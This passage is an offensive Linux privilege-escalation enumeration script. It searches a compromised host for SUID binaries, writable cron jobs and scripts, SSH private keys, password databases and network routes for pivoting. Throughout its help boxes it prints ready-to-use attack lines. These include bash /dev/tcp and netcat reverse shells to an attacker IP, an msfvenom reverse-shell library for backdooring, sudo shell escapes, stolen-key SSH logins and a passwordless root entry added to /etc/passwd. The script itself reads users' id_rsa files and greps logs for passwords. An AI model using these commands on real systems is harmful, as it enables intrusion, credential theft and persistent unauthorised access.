		echo -e "\t  /usr/bin/ntfs-3g                  |  /usr/bin/chsh"
		echo -e "\t  /usr/bin/su                       |  /usr/bin/chfn"
		echo -e "\t  /usr/bin/mount                    |  /usr/bin/sudo"
		echo -e "\t  /usr/bin/umount                   |  /usr/bin/pkexec"
		echo -e "\t  /usr/bin/passwd                   |  /usr/bin/newgrp"
		echo -e "\t  /usr/bin/gpasswd                  |  /usr/bin/fusermount"
		echo -e "\t  /usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs"
		echo -e "\t  /usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign"
		echo -e "\t  /usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1"
		echo -e "\t  /usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Most linux system have these Binaries, and they are built-in, no escalation   ║"
    echo -e "\n  ║is done by them unless file permission has been change.                       ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Finding System SUID:\033[0m"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always
echo -e "\n${BLUE}[+] SUID owned by root and current user (Interesting :D):\033[0m"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep $USER
echo -e "\n${BLUE}[+] SUID not built-in (Interesting :D)\033[0m"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v pppd | grep -v exim4 | grep -v ntfs-3g | grep -v chsh | grep -v su | grep -v chfn | grep -v mount | grep -v sudo | grep -v umount | grep -v pkexec | grep -v passwd | grep -v newgrp | grep -v gpasswd | grep -v fusermount | grep -v mount.nfs | grep -v mount.cifs | grep -v Xorg.wrap | grep -v ssh-keysign | grep -v chrome-sandbox | grep -v polkit-agent-helper-1 | grep -v vmware-user-suid-wrapper | grep -v dbus-daemon-launch-helper
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Compare the output with the built-in binaries & Goolge them for any exploit.  ║"
    echo -e "\n  ║Visite:                                                                       ║"
    echo -e "\n  ║https://gtfobins.github.io/                                                   ║"
    echo -e "\n  ║https://mil0.io/linux-privesc/                                                ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Finding System GUID:\033[0m"
    find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Visite:                                                                       ║"
    echo -e "\n  ║https://gtfobins.github.io/                                                   ║"
    echo -e "\n  ║https://mil0.io/linux-privesc/                                                ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Find Binaries that will execute as the owner:\033[0m"
    find / -perm -u=s -type f 2>/dev/null | xargs ls -la --color=always
echo -e "\n${BLUE}[+] Find binaries that will execute as the group:\033[0m"
    find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
echo -e "\n${BLUE}[+] Find sticky-bit binaries:\033[0m"
    find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
echo -e "\n${BLUE}[+] World writable scripts invoked as root:\033[0m"
echo -e "\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/dev/null | xargs ls -la\033[0m"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If you find a script that is owned by root but is writable by anyone, you can ║"
    echo -e "\n  ║add your own malicious code into it and it will escalate your privileges when ║"
    echo -e "\n  ║the script runs as root                                                       ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                     ║"
    echo -e "\n  ║  ${RED}bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file\033[0m ║"
    echo -e "\n  ║  ${RED}netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file\033[0m          ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] World writable directories:\033[0m"
    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
echo -e "\n${BLUE}[+] writable config files:\033[0m"
    find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
echo -e "\n${BLUE}[+] How Files Can Be Upload/Download:\033[0m"
    which wget nc netcat socat python python2 python3 ftp tftp ssh smb
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Some of them my have file misconfiguration and my lead to user escalation.    ║"
    echo -e "\n  ║File Transfer Cheatsheet: Windows and Linux                                   ║"
    echo -e "\n  ║https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/    ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Unexpected commands allows you to read and/or write files or even execute command:\033[0m"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e '\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║'
    echo -e "\n  ║sudo find /etc -exec sh -i \;                                                 ║"
    echo -e "\n  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║"
    echo -e "\n  ║sudo tar c a.tar -I ./runme.sh a                                              ║"
    echo -e "\n  ║ftp>!/bin/sh                                                                  ║"
    echo -e "\n  ║less>! <shell_comand>                                                         ║"
    echo -e "\n  ║                                Give it a try                                 ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Profiles files:\033[0m"
    ls -l /etc/profile /etc/profile.d/ --color=always
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║"
    echo -e "\n  ║executed when a user run a new shell. Therefore, if you can write or modify   ║"
    echo -e "\n  ║any of the files, you can escalate your privilege.                            ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Is the .bashrc file writable?\033[0m"
    ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If so, malicious commands can be written to it and will be executed when the  ║"
    echo -e "\n  ║user/root logs in.                                                            ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔════════════════════════════════════════(50%)..........................................\033[0m\n\n"
    sleep 5
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═════════════════════════════════════════════════════════[ System Process and Services ]════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Have a look to what processes are being executed and check if any process has ║"
    echo -e "\n  ║more privileges than it should. You can also use a tool called psyp.          ║"
    echo -e "\n  ║https://github.com/DominicBreuker/pspy                                        ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Running Proccess on the system:\033[0m"
    ps aux 
echo -e "\n${BLUE}[+] Running Proccess as root:\033[0m"
    ps aux | grep --color=always root
echo -e "\n${BLUE}[+] Running Proccess as current user:\033[0m"
    ps aux | grep --color=always $USER
echo -e "\n${BLUE}[+] Process binaries and associated permissions:\033[0m"
    ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null
echo -e "\n${BLUE}[+] Are service config files readable/wreitable by current user:\033[0m"
    find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la --color=always 2>/dev/null
echo -e "\n${BLUE}[+] Shared object libraries (GOOD FOR BACKDOOR):\033[0m"
    ldd /usr/local/bin/program 2>/dev/null
echo -e "\n${BLUE}[+] Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):\033[0m"
    objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If any executable is found, create the backdoor using any payload you wich    ║"
    echo -e "\n  ║using the same file found.                                                    ║"
    echo -e "\n  ║For Example:                                                                  ║"
    echo -e "\n  ║Payload using msfvenome:                                                      ║"
    echo -e "\n  ║   msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP>         ║"
    echo -e "\n  ║   LPORT=<attacker LPORT> -f elf-so -o FILENAME.so                            ║"
    echo -e "\n  ║Then send the file to the same directory, configure a Metasploit listener with║"
    echo -e "\n  ║the same payloadlunch and wait for the program to be launched by a user with  ║"
    echo -e "\n  ║elevated privileges.                                                          ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═════════════════════════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Current User Crontab:\033[0m"
    crontab -l 
echo -e "\n${BLUE}[+] Find World-Writable Cron jobs:\033[0m"
    find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 
echo -e "\n${BLUE}[+] Other User Crontab [It may need root]:\033[0m"
    cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If you have the root/user password, try to run the command manually:          ║"
    echo -e "\n  ║cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null               ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Scheduled Jobs:\033[0m"
    cat /etc/crontab 2>/dev/null 
    echo -e "\n\033[0;37;41mIf the File is Writable\033[0m"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.    ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                                                 ║"
    echo -e "\n  ║  ${RED}echo '/bin/sh' >> file\033[0m                                                                                  ║"
    echo -e "\n  ║  ${RED}echo '/bin/bash' >> file \033[0m                                                                               ║"
    echo -e "\n  ║  ${RED}echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file\033[0m                                                    ║"
    echo -e "\n  ║  ${RED}echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' >> file\033[0m                 ║"
    echo -e "\n  ║  ${RED}echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file\033[0m                                               ║"
    echo -e "\n  ║  ${RED}echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file\033[0m                                       ║"
    echo -e "\n  ║${RED}You can use any Reverse Shell payload from payloadallthethings in GitHub\033[0m                                  ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═════════════════════════════════════════════════════════[ Communications & Networking ]════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Basic Network Details:\033[0m"
    ip addr | sed -r ':a;N;$!ba;s/\n\s/ /g' | sed -r -n -e 's/^([0-9]+):\s(\w+).*(link\/(\w+))\s[a-f0-9:.]{,17}\sbrd\s[a-f0-9:.]{,17}\s*(inet\s([0-9]{1,3}(\.[0-9]{1,3}){3})).*/ \2 \6 \4/p' -e 's/^([0-9]+):\s(\w+).*(link\/(\w+))\s[a-f0-9:.]{,17}\sbrd\s[a-f0-9:.]{,17}.*/Gateway \2 0.0.0.0 \4/p' Default Gatway:
echo -e "\n${BLUE}[+] Default Gatway:\033[0m"
    route 2>/dev/null
echo -e "\n${BLUE}[+] Full Network Details:\033[0m"
    ifconfig
echo -e "\n${BLUE}[+] Firewall Rulls:\033[0m"
    iptables -nvL
echo -e "\n${BLUE}[+] Open Ports:\033[0m"
    netstat -tulpna
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Are there any open ports on localhost we did not see when we were doing nmap? ║"
    echo -e "\n  ║This might need tunneling or connecting to it locally. If nothing is displayed║"
    echo -e "\n  ║run the command manually: netstat -tulpna                                     ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Network Route & Neighbours:\033[0m"
    route; ip n
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Want to know how many hops are between our compromised machine, and other     ║"
    echo -e "\n  ║network segments, do the following manually:                                  ║"
    echo -e "\n  ║traceroute –n <ip address>                                                    ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] ARP Cashe:\033[0m"
    arp; arp -en | grep -v Address
echo -e "\n${BLUE}[+] Pivoting:\033[0m"
    echo -e "\n  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Try to scan the Host network and see if there is any other host are online, use any of:                             ║"
        echo -e '\t  ║for ip in $(seq 1 255); do ping -c 1 v.v.v.$ip | grep "bytes from"; done                                            ║'
    echo -e "\n  ║for i in {1..255}; do ping -c 1 v.v.v.$i | grep 'bytes from' ; done                                                   ║"
        echo -e '\t  ║for i in {1..255} ;do (ping v.v.v.$i -c 1 -w 5  >/dev/null && echo "v.v.v.$i Host Is Alive") ; done                 ║'
    echo -e "\n  ║We won't be able to access those machine, therefor, will have to do tunneling from the current machine to them.     ║"
    echo -e "\n  ║Read More:                                                                                                          ║"
    echo -e "\n  ║https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                              ║"
    echo -e "\n  ║https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                  ║"
    echo -e "\n  ║https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/           ║"
    echo -e "\n  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Hosts File:\033[0m"
    cat /etc/hosts 
echo -e "\n${BLUE}[+] DNS Server:\033[0m"
    cat /etc/resolv.conf | grep nameserver
echo -e "\n${BLUE}[+] Outbound port connectivity:\033[0m"
    nmap -sT -p4444-4450 portquiz.net 2>/dev/null
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Knowing this information will come in handy if and when we need to establish   ║"
    echo -e "\n  ║outbound connections to other systems we control for the purpose of maintaining║"
    echo -e "\n  ║access or exfiltrating data.                                                   ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔════════════════════════════════════════(80%)═════════════════.........................\033[0m\n\n"
    sleep 5
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═══════════════════════════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Identify any existing public or private keys:\033[0m"
    ls -la /root /etc/ssh /home/*/.ssh/ --color=always 2>/dev/null; cat /home/*/.ssh/id_rsa 2>/dev/null; cat /home/*/.ssh/id_dsa 2>/dev/null
echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys\033[0m"
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely      ║"
    echo -e "\n  ║perform a number of network services, such as remote authentication or file transfer over  ║"
    echo -e "\n  ║an unsecured network. Exploite:                                                            ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] id_rsa:\033[0m"
    find / -name id_rsa 2>/dev/null 
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If anyone have access to any user's id_rsa, he can login to the system using that key.     ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                                  ║"
    echo -e "\n  ║  ${RED}scp -P 22 username@v.v.v.v:/path/of/victim /path/to/attacker\033[0m                             ║"
    echo -e "\n  ║  ${RED}chmod 0600 id_rsa\033[0m                                                                        ║"
    echo -e "\n  ║  ${RED}ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa\033[0m                                               ║"
    echo -e "\n  ║Read More:                                                                                 ║"
    echo -e "\n  ║https://matt.might.net/articles/ssh-hacks/                                                 ║"
    echo -e "\n  ║https://book.hacktricks.xyz/pentesting/pentesting-ssh                                      ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] id_dsa:\033[0m"
    find / -name id_dsa 2>/dev/null
echo -e "\n${BLUE}[+] authorized_keys:\033[0m"
    find / -name authorized_keys 2>/dev/null
echo -e "\n${BLUE}[+] ssh_config File:\033[0m"
    ls -la /etc/ssh/ssh_config | grep config --color=always
    ls -la /usr/share/openssh/sshd_config | grep config --color=always
echo -e "\n${BLUE}[+] Reading ssh_config File:\033[0m"
    cat /etc/ssh/ssh_config
    /usr/share/openssh/sshd_config
echo -e "\n${BLUE}[+] hosts.denied:\033[0m"
    ls -la /etc/hosts.denied --color=always 2>/dev/null 
echo -e "\n${BLUE}[+] Reading hosts.denied:\033[0m"
    cat /etc/hosts.denied 2>/dev/null 
echo -e "\n${BLUE}[+] hosts.allow:\033[0m"
    ls -la /etc/hosts.allow --color=always 2>/dev/null 
echo -e "\n${BLUE}[+] Reading hosts.allow:\033[0m"
    cat /etc/hosts.allow 2>/dev/null 
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║When a client attempts to connect to a network service on a remote system, these files are     ║"
    echo -e "\n  ║used to determine whether client access is allowed or denied. Use /etc/hosts.allow and         ║"
    echo -e "\n  ║/etc/hosts.deny to define rules that selectively allow or deny clients access to server        ║"
    echo -e "\n  ║daemons on local system.                                                                       ║"
    echo -e "\n  ║Read More:                                                                                     ║"
    echo -e "\n  ║https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                              ║"
    echo -e "\n  ║http://www.freekb.net/Article?id=1091                                                          ║"
    echo -e "\n  ║https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/ ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Any active SSH session:\033[0m"
    ps aux | grep sshd
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If any session is found, the session can be hijacked. Read more about SSH session hijacking:   ║"
    echo -e "\n  ║  https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                    ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═════════════════════════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Mail File:\033[0m"
    ls -la /var/mail/ --color=always 2>/dev/null
echo -e "\n${BLUE}[+] Root Directory:\033[0m"
    ls -la /root/ 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Home Directory:\033[0m"
    ls -la /home/ --color=always 2>/dev/null
echo -e "\n${BLUE}[+] Tmp Directory:\033[0m"
    ls -la /tmp  --color=always 2>/dev/null
echo -e "\n${BLUE}[+] Backup Directory:\033[0m"
    ls -la /var/backups 2>/dev/null && find / -type f  -name *backup* -o -name *.bak -o -name *.bak* -o -name *.bck -o -name *.bk -o -name *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
echo -e "\n${BLUE}[+] Apache2 Version:\033[0m"
    apache2 -v 2>/dev/null; httpd -v 2>/dev/null
echo -e "\n${BLUE}[+] Apache user:\033[0m"
    grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Apache Config File:\033[0m"
    cat /var/apache2/config.inc 2>/dev/null 
echo -e "\n${BLUE}[+] Check readability of apache/nginx access log:\033[0m"
    cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null
    cat /var/log/apache2/access.log 2>/dev/null
    nginx= cat /var/log/nginx/access.log 2>/dev/null 
echo -e "\n${BLUE}[+] MySQL Version:\033[0m"
    mysql --version 2>/dev/null --color=always
echo -e "\n${BLUE}[+] MySQL:\033[0m"
    ls -la /var/lib/mysql 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Log File:\033[0m"
    ls -la /var/log 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Spool File:\033[0m"
    ls -la /var/spool 2>/dev/null --color=always
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Contains data which is awaiting some kind of later processing. Data in /var/spool ║"
    echo -e "\n  ║represents work to be done in the future (by a program, user, or administrator);  ║"
    echo -e "\n  ║often data is deleted after it has been processed.                                ║"
    echo -e "\n  ║Read More:                                                                        ║"
    echo -e "\n  ║https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                     ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] PostgreSQL Version:\033[0m"
    psql -V 2>/dev/null
echo -e "\n${BLUE}[+] PostgreSQL:\033[0m"
    ls -la /var/lib/pgsql 2>/dev/null
echo -e "\n${BLUE}[+] System files dont belong to root:\033[0m"
    find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Tools/Languages Installed:\033[0m"
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Some of the tools have an exploit, do compgen -c to list all of the tools.    ║"
    echo -e "\n  ║Exploit: https://gtfobins.github.io/                                          ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Read roots mail:\033[0m"
    head /var/mail/root 2>/dev/null
echo -e "\n${BLUE}[+] Config Files:\033[0m"
    find / -name *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Bash Files:\033[0m"
    find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/"
echo -e "\n${BLUE}[+] .GPG Files:\033[0m"
    find / -name *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║A GPG file is a security key used to decrypt an encrypted file generated by GNU║"
    echo -e "\n  ║Privacy Guard (GnuPG), a file encryption program. The secure format is based on║"
    echo -e "\n  ║the OpenPGP standard defined by RFC2440,the same standard Pretty Good Privacy  ║"
    echo -e "\n  ║(.PGP) files use.                                                              ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Python Files:\033[0m"
    find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/\|/opt/xplico/"
echo -e "\n${BLUE}[+] KeePass database file:\033[0m"
    echo -e "[*] .kdbx files:"
    find / -name *.kdbx -type f 2>/dev/null
    echo -e "[*] .kdb files:"
    find / -name *.kdb -type f 2>/dev/null
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║KeePass is a free open source password manager, which helps you to manage your ║"
    echo -e "\n  ║passwords in a secure way. You can store all your passwords in one database,   ║"
    echo -e "\n  ║which is locked with a master key. There are many exploits on the internet.    ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Print IPSEC VPN Keys (requires root):\033[0m"
    ip xfrm state list
echo -e "\n${BLUE}[+] OpenLDAP Configuration:\033[0m" 
    cat /etc/openldap/ldap.conf 2>/dev/null
echo -e "\n${BLUE}[+] Current user trash files:\033[0m"
    ls -la ~/.local/share/Trash/ 2>/dev/null
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Have a look at the trash files and see if you can find any useful information. ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\t\tEnumeration is completed ╔════════════════════════════════════════(100%)════════════════════════════════════════╗\033[0m\n\n"
